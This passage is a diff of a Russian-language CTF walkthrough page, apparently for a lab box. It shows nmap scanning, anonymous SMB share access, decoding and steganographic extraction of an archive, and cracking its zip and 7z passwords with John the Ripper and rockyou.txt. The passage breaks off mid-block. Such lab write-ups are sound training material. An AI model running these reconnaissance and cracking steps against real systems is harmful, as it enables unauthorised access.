@@ -821,6 +821,11 @@
 </tbody>
 </table>
 <h2 id="t1046-t1039">Разведка — <code>T1046</code>, <code>T1039</code></h2>
+<details class="note">
+<summary>Результат работы nmap</summary>
+<div class="tabbed-set tabbed-alternate" data-tabs="1:1"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="__tabbed_1_1">Nmap Scan</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
 <div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
 <span class="normal"> 2</span>
 <span class="normal"> 3</span>
@@ -857,45 +862,54 @@
 <span class="normal">34</span>
 <span class="normal">35</span>
 <span class="normal">36</span>
-<span class="normal">37</span></pre></div></td><td class="code"><div><pre><span></span><code>$<span class="w"> </span>nmap<span class="w"> </span>-sS<span class="w"> </span>-sC<span class="w"> </span>-p-<span class="w"> </span><span class="m">10</span>.113.182.130
-Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.99<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2026</span>-07-01<span class="w"> </span><span class="m">05</span>:00<span class="w"> </span>-0400
-Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.113.182.130
-Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.091s<span class="w"> </span>latency<span class="o">)</span>.
-Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">65532</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>reset<span class="o">)</span>
-PORT<span class="w">    </span>STATE<span class="w"> </span>SERVICE
-<span class="m">22</span>/tcp<span class="w">  </span>open<span class="w">  </span>ssh
-<span class="p">|</span><span class="w"> </span>ssh-hostkey:<span class="w"> </span>
-<span class="p">|</span><span class="w">   </span><span class="m">2048</span><span class="w"> </span><span class="m">21</span>:ee:30:4f:f8:f7:9f:32:6e:42:95:f2:1a:1a:04:d3<span class="w"> </span><span class="o">(</span>RSA<span class="o">)</span>
-<span class="p">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span>dc:fc:de:d6:ec:43:61:00:54:9b:7c:40:1e:8f:52:c4<span class="w"> </span><span class="o">(</span>ECDSA<span class="o">)</span>
-<span class="p">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span><span class="m">12</span>:81:25:6e:08:64:f6:ef:f5:0c:58:71:18:38:a5:c6<span class="w"> </span><span class="o">(</span>ED25519<span class="o">)</span>
-<span class="m">139</span>/tcp<span class="w"> </span>open<span class="w">  </span>netbios-ssn
-<span class="m">445</span>/tcp<span class="w"> </span>open<span class="w">  </span>microsoft-ds
+<span class="normal">37</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>nmap<span class="w"> </span>-sS<span class="w"> </span>-sC<span class="w"> </span>-p-<span class="w"> </span><span class="m">10</span>.113.182.130
+<span class="go">Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-01 05:00 -0400</span>
+<span class="go">Nmap scan report for 10.113.182.130</span>
+<span class="go">Host is up (0.091s latency).</span>
+<span class="go">Not shown: 65532 closed tcp ports (reset)</span>
+<span class="go">PORT    STATE SERVICE</span>
+<span class="go">22/tcp  open  ssh</span>
+<span class="go">| ssh-hostkey: </span>
+<span class="go">|   2048 21:ee:30:4f:f8:f7:9f:32:6e:42:95:f2:1a:1a:04:d3 (RSA)</span>
+<span class="go">|   256 dc:fc:de:d6:ec:43:61:00:54:9b:7c:40:1e:8f:52:c4 (ECDSA)</span>
+<span class="go">|_  256 12:81:25:6e:08:64:f6:ef:f5:0c:58:71:18:38:a5:c6 (ED25519)</span>
+<span class="go">139/tcp open  netbios-ssn</span>
+<span class="go">445/tcp open  microsoft-ds</span>
 
-Host<span class="w"> </span>script<span class="w"> </span>results:
-<span class="p">|</span><span class="w"> </span>smb-security-mode:<span class="w"> </span>
-<span class="p">|</span><span class="w">   </span>account_used:<span class="w"> </span>guest
-<span class="p">|</span><span class="w">   </span>authentication_level:<span class="w"> </span>user
-<span class="p">|</span><span class="w">   </span>challenge_response:<span class="w"> </span>supported
-<span class="p">|</span>_<span class="w">  </span>message_signing:<span class="w"> </span>disabled<span class="w"> </span><span class="o">(</span>dangerous,<span class="w"> </span>but<span class="w"> </span>default<span class="o">)</span>
-<span class="p">|</span><span class="w"> </span>smb2-security-mode:<span class="w"> </span>
-<span class="p">|</span><span class="w">   </span><span class="m">3</span>.1.1:<span class="w"> </span>
-<span class="p">|</span>_<span class="w">    </span>Message<span class="w"> </span>signing<span class="w"> </span>enabled<span class="w"> </span>but<span class="w"> </span>not<span class="w"> </span>required
-<span class="p">|</span>_nbstat:<span class="w"> </span>NetBIOS<span class="w"> </span>name:<span class="w"> </span>UBUNTU,<span class="w"> </span>NetBIOS<span class="w"> </span>user:<span class="w"> </span>&lt;unknown&gt;,<span class="w"> </span>NetBIOS<span class="w"> </span>MAC:<span class="w"> </span>&lt;unknown&gt;<span class="w"> </span><span class="o">(</span>unknown<span class="o">)</span>
-<span class="p">|</span><span class="w"> </span>smb-os-discovery:<span class="w"> </span>
-<span class="p">|</span><span class="w">   </span>OS:<span class="w"> </span>Windows<span class="w"> </span><span class="m">6</span>.1<span class="w"> </span><span class="o">(</span>Samba<span class="w"> </span><span class="m">4</span>.7.6-Ubuntu<span class="o">)</span>
-<span class="p">|</span><span class="w">   </span>Computer<span class="w"> </span>name:<span class="w"> </span>cherryblossom
-<span class="p">|</span><span class="w">   </span>NetBIOS<span class="w"> </span>computer<span class="w"> </span>name:<span class="w"> </span>UBUNTU<span class="se">\x</span><span class="m">00</span>
-<span class="p">|</span><span class="w">   </span>Domain<span class="w"> </span>name:<span class="w"> </span><span class="se">\x</span><span class="m">00</span>
-<span class="p">|</span><span class="w">   </span>FQDN:<span class="w"> </span>cherryblossom
-<span class="p">|</span>_<span class="w">  </span>System<span class="w"> </span>time:<span class="w"> </span><span class="m">2026</span>-07-01T10:04:05+01:00
-<span class="p">|</span><span class="w"> </span>smb2-time:<span class="w"> </span>
-<span class="p">|</span><span class="w">   </span>date:<span class="w"> </span><span class="m">2026</span>-07-01T09:04:05
-<span class="p">|</span>_<span class="w">  </span>start_date:<span class="w"> </span>N/A
-<span class="p">|</span>_clock-skew:<span class="w"> </span>mean:<span class="w"> </span>-19m58s,<span class="w"> </span>deviation:<span class="w"> </span>34m37s,<span class="w"> </span>median:<span class="w"> </span>0s
+<span class="go">Host script results:</span>
+<span class="go">| smb-security-mode: </span>
+<span class="go">|   account_used: guest</span>
+<span class="go">|   authentication_level: user</span>
+<span class="go">|   challenge_response: supported</span>
+<span class="go">|_  message_signing: disabled (dangerous, but default)</span>
+<span class="go">| smb2-security-mode: </span>
+<span class="go">|   3.1.1: </span>
+<span class="go">|_    Message signing enabled but not required</span>
+<span class="go">|_nbstat: NetBIOS name: UBUNTU, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span>
+<span class="go">| smb-os-discovery: </span>
+<span class="go">|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)</span>
+<span class="go">|   Computer name: cherryblossom</span>
+<span class="go">|   NetBIOS computer name: UBUNTU\x00</span>
+<span class="go">|   Domain name: \x00</span>
+<span class="go">|   FQDN: cherryblossom</span>
+<span class="go">|_  System time: 2026-07-01T10:04:05+01:00</span>
+<span class="go">| smb2-time: </span>
+<span class="go">|   date: 2026-07-01T09:04:05</span>
+<span class="go">|_  start_date: N/A</span>
+<span class="go">|_clock-skew: mean: -19m58s, deviation: 34m37s, median: 0s</span>
 
-Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">220</span>.76<span class="w"> </span>seconds
+<span class="go">Nmap done: 1 IP address (1 host up) scanned in 220.76 seconds</span>
 </code></pre></div></td></tr></table></div>
-<p>Сканирование хоста с помощью <code>nmap</code> показало три сервиса на трёх открытых портах. Наиболее ценным на этот момент является сервис SMB на 445 порту. Кроме того, применение флага <code>-sC</code> позволило узнать, что к этому сервис разрешен анонимный доступ.</p>
+</div>
+</div>
+</div>
+</details>
+<p>Сканирование хоста с помощью <code>nmap</code> показало три сервиса на трёх открытых портах. Наиболее ценным на этот момент является сервис SMB на 445 порту. Кроме того, применение флага <code>-sC</code> позволило узнать, что к этому сервису разрешен анонимный доступ.</p>
+<details class="note">
+<summary>Результат работы smbclient</summary>
+<div class="tabbed-set tabbed-alternate" data-tabs="2:1"><input checked="checked" id="__tabbed_2_1" name="__tabbed_2" type="radio" /><div class="tabbed-labels"><label for="__tabbed_2_1">smbclient</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
 <div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
 <span class="normal"> 2</span>
 <span class="normal"> 3</span>
@@ -911,24 +925,33 @@ Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span>
 <span class="normal">13</span>
 <span class="normal">14</span>
 <span class="normal">15</span>
-<span class="normal">16</span></pre></div></td><td class="code"><div><pre><span></span><code>$<span class="w"> </span>smbclient<span class="w"> </span>-L<span class="w"> </span>//10.113.182.130/<span class="w"> </span>-N<span class="w">         </span>
-Anonymous<span class="w"> </span>login<span class="w"> </span>successful
+<span class="normal">16</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>smbclient<span class="w"> </span>-L<span class="w"> </span>//10.113.182.130/<span class="w"> </span>-N<span class="w">         </span>
+<span class="go">Anonymous login successful</span>
 
-<span class="w">        </span>Sharename<span class="w">       </span>Type<span class="w">      </span>Comment
-<span class="w">        </span>---------<span class="w">       </span>----<span class="w">      </span>-------
-<span class="w">        </span>Anonymous<span class="w">       </span>Disk<span class="w">      </span>Anonymous<span class="w"> </span>File<span class="w"> </span>Server<span class="w"> </span>Share
-<span class="w">        </span>IPC$<span class="w">            </span>IPC<span class="w">       </span>IPC<span class="w"> </span>Service<span class="w"> </span><span class="o">(</span>Samba<span class="w"> </span><span class="m">4</span>.7.6-Ubuntu<span class="o">)</span>
-Reconnecting<span class="w"> </span>with<span class="w"> </span>SMB1<span class="w"> </span><span class="k">for</span><span class="w"> </span>workgroup<span class="w"> </span>listing.
-Anonymous<span class="w"> </span>login<span class="w"> </span>successful
+<span class="go">        Sharename       Type      Comment</span>
+<span class="go">        ---------       ----      -------</span>
+<span class="go">        Anonymous       Disk      Anonymous File Server Share</span>
+<span class="go">        IPC$            IPC       IPC Service (Samba 4.7.6-Ubuntu)</span>
+<span class="go">Reconnecting with SMB1 for workgroup listing.</span>
+<span class="go">Anonymous login successful</span>
 
-<span class="w">        </span>Server<span class="w">               </span>Comment
-<span class="w">        </span>---------<span class="w">            </span>-------
+<span class="go">        Server               Comment</span>
+<span class="go">        ---------            -------</span>
 
-<span class="w">        </span>Workgroup<span class="w">            </span>Master
-<span class="w">        </span>---------<span class="w">            </span>-------
-<span class="w">        </span>WORKGROUP<span class="w">            </span>UBUNTU
+<span class="go">        Workgroup            Master</span>
+<span class="go">        ---------            -------</span>
+<span class="go">        WORKGROUP            UBUNTU</span>
 </code></pre></div></td></tr></table></div>
+</div>
+</div>
+</div>
+</details>
 <p>После подключения к сервису была обнаружена шара Anonymous.</p>
+<details class="note">
+<summary>Результат работы smbclient</summary>
+<div class="tabbed-set tabbed-alternate" data-tabs="3:1"><input checked="checked" id="__tabbed_3_1" name="__tabbed_3" type="radio" /><div class="tabbed-labels"><label for="__tabbed_3_1">smbclient</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
 <div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
 <span class="normal"> 2</span>
 <span class="normal"> 3</span>
@@ -939,48 +962,55 @@ Anonymous<span class="w"> </span>login<span class="w"> </span>successful
 <span class="normal"> 8</span>
 <span class="normal"> 9</span>
 <span class="normal">10</span>
-<span class="normal">11</span></pre></div></td><td class="code"><div><pre><span></span><code>$<span class="w"> </span>smbclient<span class="w"> </span>//10.113.182.130/Anonymous<span class="w"> </span>-N
-Anonymous<span class="w"> </span>login<span class="w"> </span>successful
-Try<span class="w"> </span><span class="s2">"help"</span><span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>a<span class="w"> </span>list<span class="w"> </span>of<span class="w"> </span>possible<span class="w"> </span>commands.
-smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>ls
-<span class="w">  </span>.<span class="w">                                   </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Sun<span class="w"> </span>Feb<span class="w">  </span><span class="m">9</span><span class="w"> </span><span class="m">19</span>:22:51<span class="w"> </span><span class="m">2020</span>
-<span class="w">  </span>..<span class="w">                                  </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Sun<span class="w"> </span>Feb<span class="w">  </span><span class="m">9</span><span class="w"> </span><span class="m">12</span>:48:18<span class="w"> </span><span class="m">2020</span>
-<span class="w">  </span>journal.txt<span class="w">                         </span>N<span class="w">  </span><span class="m">3470998</span><span class="w">  </span>Sun<span class="w"> </span>Feb<span class="w">  </span><span class="m">9</span><span class="w"> </span><span class="m">19</span>:20:53<span class="w"> </span><span class="m">2020</span>
+<span class="normal">11</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>smbclient<span class="w"> </span>//10.113.182.130/Anonymous<span class="w"> </span>-N
+<span class="go">Anonymous login successful</span>
+<span class="go">Try "help" to get a list of possible commands.</span>
+<span class="go">smb: \&gt; ls</span>
+<span class="go">.                                   D        0  Sun Feb  9 19:22:51 2020</span>
+<span class="go">..                                  D        0  Sun Feb  9 12:48:18 2020</span>
+<span class="go">journal.txt                         N  3470998  Sun Feb  9 19:20:53 2020</span>
 
-<span class="w">                </span><span class="m">10253588</span><span class="w"> </span>blocks<span class="w"> </span>of<span class="w"> </span>size<span class="w"> </span><span class="m">1024</span>.<span class="w"> </span><span class="m">4680100</span><span class="w"> </span>blocks<span class="w"> </span>available
-smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>get<span class="w"> </span>journal.txt
-getting<span class="w"> </span>file<span class="w"> </span><span class="se">\j</span>ournal.txt<span class="w"> </span>of<span class="w"> </span>size<span class="w"> </span><span class="m">3470998</span><span class="w"> </span>as<span class="w"> </span>journal.txt<span class="w"> </span><span class="o">(</span><span class="m">1179</span>.4<span class="w"> </span>KiloBytes/sec<span class="o">)</span><span class="w"> </span><span class="o">(</span>average<span class="w"> </span><span class="m">1179</span>.4<span class="w"> </span>KiloBytes/sec<span class="o">)</span>
+<span class="go">                10253588 blocks of size 1024. 4680100 blocks available</span>
+<span class="go">smb: \&gt; get journal.txt</span>
+<span class="go">getting file \journal.txt of size 3470998 as journal.txt (1179.4 KiloBytes/sec) (average 1179.4 KiloBytes/sec)</span>
 </code></pre></div></td></tr></table></div>
+</div>
+</div>
+</div>
+</details>
 <p>Внутри вышеупомянутой шары находился файл <code>journal.txt</code>.</p>
 <h2 id="t1027003-t1110002-t1552001">Анализ полученных данных и первый флаг — T1027.003, T1110.002, T1552.001</h2>
 <h3 id="_3">Исследование файла</h3>
 <p><img alt="Содержимое файла journal.txt" src="../cblossom-journal.webp" /></p>
 <p>Содержимое файла закодировано с помощью base64. Для декодирования была использована утилита <code>base64</code> с флагом <code>-d</code>.</p>
-<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code>$<span class="w"> </span>cat<span class="w"> </span>journal.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span>&gt;<span class="w"> </span>result
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>cat<span class="w"> </span>journal.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span>&gt;<span class="w"> </span>result
 </code></pre></div></td></tr></table></div>
 <p>После декодирования содержимое не приобрело читабельный вид, но при использовании утилиты <code>file</code> удалось обнаружить, что в результате декодирования было получено изображение формата png.</p>
 <div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
-<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code>$<span class="w"> </span>file<span class="w"> </span>result<span class="w">         </span>
-result:<span class="w"> </span>PNG<span class="w"> </span>image<span class="w"> </span>data,<span class="w"> </span><span class="m">1280</span><span class="w"> </span>x<span class="w"> </span><span class="m">853</span>,<span class="w"> </span><span class="m">8</span>-bit/color<span class="w"> </span>RGB,<span class="w"> </span>non-interlaced
+<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>file<span class="w"> </span>result<span class="w">         </span>
+<span class="go">result: PNG image data, 1280 x 853, 8-bit/color RGB, non-interlaced</span>
 </code></pre></div></td></tr></table></div>
 <h3 id="_4">Стеганография</h3>
+<details class="note">
+<summary>Полученное изображение</summary>
 <p><img alt="Изображение" src="../cblossom-stego.webp" /></p>
+</details>
 <p>Для анализа изображения на наличие скрытых файлов был использован тул <code>stegpy</code>.</p>
 <div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
-<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code>$<span class="w"> </span>stegpy<span class="w"> </span>result
-File<span class="w"> </span>_journal.zip<span class="w"> </span>succesfully<span class="w"> </span>extracted<span class="w"> </span>from<span class="w"> </span>result
+<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>stegpy<span class="w"> </span>result
+<span class="go">File _journal.zip succesfully extracted from result</span>
 </code></pre></div></td></tr></table></div>
 <p>Применение <code>stegpy</code> позволило извлечь скрытый архив формата <code>zip</code>, при распаковке которого возникла ошибка, сообщающая о том, что архив повреждён.</p>
 <div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
 <span class="normal">2</span>
-<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code>$<span class="w"> </span>unzip<span class="w"> </span>_journal.zip
-Archive:<span class="w">  </span>_journal.zip
-file<span class="w"> </span><span class="c1">#1:  bad zipfile offset (local header sig):  0</span>
+<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>unzip<span class="w"> </span>_journal.zip
+<span class="go">Archive:  _journal.zip</span>
+<span class="go">file #1:  bad zipfile offset (local header sig):  0</span>
 </code></pre></div></td></tr></table></div>
 <p>В ходе дальнейшего анализа полученного архива была применена утилита <code>file</code>, с помощью которой удалось узнать, что файл является изображением формата <code>jpeg</code>.</p>
 <div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
-<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code>$<span class="w"> </span>file<span class="w"> </span>_journal.zip
-_journal.zip:<span class="w"> </span>JPEG<span class="w"> </span>image<span class="w"> </span>data
+<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>file<span class="w"> </span>_journal.zip
+<span class="go">_journal.zip: JPEG image data</span>
 </code></pre></div></td></tr></table></div>
 <p>В попытке восстановить поврежденный архив была предпринята попытка изменить магическое число файла на магическое число, присущее файлам с расширениям <code>.zip</code> (<code>50 4B 03 04</code>).</p>
 <p><img alt="Изменение магического числа" src="../cblossom-hexedit.webp" /></p>
@@ -989,10 +1019,10 @@ _journal.zip:<span class="w"> </span>JPEG<span class="w"> </span>image<span clas
 <div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
 <span class="normal">2</span>
 <span class="normal">3</span>
-<span class="normal">4</span></pre></div></td><td class="code"><div><pre><span></span><code>$<span class="w"> </span>unzip<span class="w"> </span>_journal.zip
-Archive:<span class="w">  </span>_journal.zip
-<span class="o">[</span>_journal.zip<span class="o">]</span><span class="w"> </span>Journal.ctz<span class="w"> </span>password:<span class="w"> </span>
-<span class="w">   </span>skipping:<span class="w"> </span>Journal.ctz<span class="w">             </span>incorrect<span class="w"> </span>password
+<span class="normal">4</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>unzip<span class="w"> </span>_journal.zip
+<span class="go">Archive:  _journal.zip</span>
+<span class="go">[_journal.zip] Journal.ctz password: </span>
+<span class="go">   skipping: Journal.ctz             incorrect password</span>
 </code></pre></div></td></tr></table></div>
 <p>Для подбора пароля к архиву воспользовался связкой тулов <code>zip2john</code> + <code>JohnTheRipper</code>.</p>
 <div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
@@ -1000,62 +1030,71 @@ Archive:<span class="w">  </span>_journal.zip
 ver<span class="w"> </span><span class="m">2</span>.0<span class="w"> </span>efh<span class="w"> </span><span class="m">5455</span><span class="w"> </span>efh<span class="w"> </span><span class="m">7875</span><span class="w"> </span>_journal.zip/Journal.ctz<span class="w"> </span>PKZIP<span class="w"> </span>Encr:<span class="w"> </span>TS_chk,<span class="w"> </span><span class="nv">cmplen</span><span class="o">=</span><span class="m">70461</span>,<span class="w"> </span><span class="nv">decmplen</span><span class="o">=</span><span class="m">70434</span>,<span class="w"> </span><span class="nv">crc</span><span class="o">=</span>0B987D84<span class="w"> </span><span class="nv">ts</span><span class="o">=</span><span class="m">0035</span><span class="w"> </span><span class="nv">cs</span><span class="o">=</span><span class="m">0035</span><span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="m">8</span>
 </code></pre></div></td></tr></table></div>
 <p>Получшившийся после применения <code>zip2john</code> хэш необходимо передать <code>JohnTheRipper</code> для осуществления подбора пароля. В качестве словаря использовался <code>rockyou.txt</code>.</p>
+<details class="note">
+<summary>Результат работы JohnTheRipper</summary>
 <div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
 <span class="normal">2</span>
 <span class="normal">3</span>
 <span class="normal">4</span>
-<span class="normal">5</span></pre></div></td><td class="code"><div><pre><span></span><code>$<span class="w"> </span>john<span class="w"> </span>--wordlist<span class="o">=</span>rockyou.txt<span class="w"> </span>zip_hash.txt
-Loaded<span class="w"> </span><span class="m">1</span><span class="w"> </span>password<span class="w"> </span><span class="nb">hash</span><span class="w"> </span><span class="o">(</span>PKZIP<span class="w"> </span><span class="o">[</span><span class="m">32</span>/64<span class="o">])</span>
-Press<span class="w"> </span><span class="s1">'q'</span><span class="w"> </span>or<span class="w"> </span>Ctrl-C<span class="w"> </span>to<span class="w"> </span>abort,<span class="w"> </span>almost<span class="w"> </span>any<span class="w"> </span>other<span class="w"> </span>key<span class="w"> </span><span class="k">for</span><span class="w"> </span>status
-<span class="o">[</span>REDACTED<span class="o">]</span><span class="w">        </span><span class="o">(</span>_journal.zip/Journal.ctz<span class="o">)</span><span class="w">     </span>
-1g<span class="w"> </span><span class="m">0</span>:00:00:00<span class="w"> </span>DONE<span class="w"> </span><span class="o">(</span><span class="m">2026</span>-07-01<span class="w"> </span><span class="m">06</span>:39<span class="o">)</span><span class="w"> </span><span class="m">50</span>.00g/s<span class="w"> </span>409600p/s<span class="w"> </span>409600c/s<span class="w"> </span>409600C/s<span class="w"> </span><span class="m">123456</span>..whitetiger
+<span class="normal">5</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>john<span class="w"> </span>--wordlist<span class="o">=</span>rockyou.txt<span class="w"> </span>zip_hash.txt
+<span class="go">Loaded 1 password hash (PKZIP [32/64])</span>
+<span class="go">Press 'q' or Ctrl-C to abort, almost any other key for status</span>
+<span class="go">[REDACTED]        (_journal.zip/Journal.ctz)     </span>
+<span class="go">1g 0:00:00:00 DONE (2026-07-01 06:39) 50.00g/s 409600p/s 409600c/s 409600C/s 123456..whitetiger</span>
 </code></pre></div></td></tr></table></div>
+</details>
 <p>При помощи полученного пароля было извлечено содержимое архива.</p>
 <div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
 <span class="normal">2</span>
 <span class="normal">3</span>
-<span class="normal">4</span></pre></div></td><td class="code"><div><pre><span></span><code>$<span class="w"> </span>unzip<span class="w"> </span>_journal.zip
-Archive:<span class="w">  </span>_journal.zip
-<span class="o">[</span>_journal.zip<span class="o">]</span><span class="w"> </span>Journal.ctz<span class="w"> </span>password:<span class="w"> </span>
-<span class="w">  </span>inflating:<span class="w"> </span>Journal.ctz<span class="w"> </span>
+<span class="normal">4</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>unzip<span class="w"> </span>_journal.zip
+<span class="go">Archive:  _journal.zip</span>
+<span class="go">[_journal.zip] Journal.ctz password: </span>
+<span class="go">  inflating: Journal.ctz </span>
 </code></pre></div></td></tr></table></div>
 <p>Внутри архива находился ещё один архив, который точно также требовал пароль для распаковки содержимого. Это архив формата <code>7z</code>, который является производной приложения Cherrytree, являющимся хранилищем заметок. Этот архив можно открыть в данном приложении.</p>
 <div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
-<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code>$<span class="w"> </span>file<span class="w"> </span>Journal.ctz<span class="w"> </span>
-Journal.ctz:<span class="w"> </span><span class="m">7</span>-zip<span class="w"> </span>archive<span class="w"> </span>data,<span class="w"> </span>version<span class="w"> </span><span class="m">0</span>.4
+<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>file<span class="w"> </span>Journal.ctz<span class="w"> </span>
+<span class="go">Journal.ctz: 7-zip archive data, version 0.4</span>
 </code></pre></div></td></tr></table></div>
 <p>Для того, чтобы осуществить подбор пароля для архива формата <code>7z</code>, воспользовался связкой тулов <code>7z2john</code> + <code>JohnTheRipper</code>.</p>
 <div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
-<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code>$<span class="w"> </span>7z2john<span class="w"> </span>Journal.ctz<span class="w"> </span>&gt;<span class="w"> </span>7z_hash.txt
-ATTENTION:<span class="w"> </span>the<span class="w"> </span>hashes<span class="w"> </span>might<span class="w"> </span>contain<span class="w"> </span>sensitive<span class="w"> </span>encrypted<span class="w"> </span>data.<span class="w"> </span>Be<span class="w"> </span>careful<span class="w"> </span>when<span class="w"> </span>sharing<span class="w"> </span>or<span class="w"> </span>posting<span class="w"> </span>these<span class="w"> </span>hashes
+<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>7z2john<span class="w"> </span>Journal.ctz<span class="w"> </span>&gt;<span class="w"> </span>7z_hash.txt
+<span class="go">ATTENTION: the hashes might contain sensitive encrypted data. Be careful when sharing or posting these hashes</span>
 </code></pre></div></td></tr></table></div>
 <p>Полученный при использовании <code>7z2john</code> хэш необходимо вновь передать <code>JohnTheRipper</code> для подбора пароля. Использовался словарь <code>rockyou.txt</code>.</p>
+<details class="note">
+<summary>Результат работы JohnTheRipper</summary>
 <div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
 <span class="normal">2</span>
 <span class="normal">3</span>
 <span class="normal">4</span>
-<span class="normal">5</span></pre></div></td><td class="code"><div><pre><span></span><code>$<span class="w"> </span>john<span class="w"> </span>--wordlist<span class="o">=</span>rockyou.txt<span class="w"> </span>7z_hash.txt<span class="w"> </span>
-Using<span class="w"> </span>default<span class="w"> </span>input<span class="w"> </span>encoding:<span class="w"> </span>UTF-8
-Loaded<span class="w"> </span><span class="m">1</span><span class="w"> </span>password<span class="w"> </span><span class="nb">hash</span><span class="w"> </span><span class="o">(</span>7z,<span class="w"> </span><span class="m">7</span>-Zip<span class="w"> </span>archive<span class="w"> </span>encryption<span class="w"> </span><span class="o">[</span>SHA256<span class="w"> </span><span class="m">256</span>/256<span class="w"> </span>AVX2<span class="w"> </span>8x<span class="w"> </span>AES<span class="o">])</span>
-<span class="o">[</span>REDACTED<span class="o">]</span><span class="w">        </span><span class="o">(</span>Journal.ctz<span class="o">)</span><span class="w">     </span>
-1g<span class="w"> </span><span class="m">0</span>:00:01:19<span class="w"> </span>DONE<span class="w"> </span><span class="o">(</span><span class="m">2026</span>-07-01<span class="w"> </span><span class="m">06</span>:55<span class="o">)</span><span class="w"> </span><span class="m">0</span>.01264g/s<span class="w"> </span><span class="m">70</span>.79p/s<span class="w"> </span><span class="m">70</span>.79c/s<span class="w"> </span><span class="m">70</span>.79C/s<span class="w"> </span>spartans..inferno
+<span class="normal">5</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>john<span class="w"> </span>--wordlist<span class="o">=</span>rockyou.txt<span class="w"> </span>7z_hash.txt<span class="w"> </span>
+<span class="go">Using default input encoding: UTF-8</span>
+<span class="go">Loaded 1 password hash (7z, 7-Zip archive encryption [SHA256 256/256 AVX2 8x AES])</span>
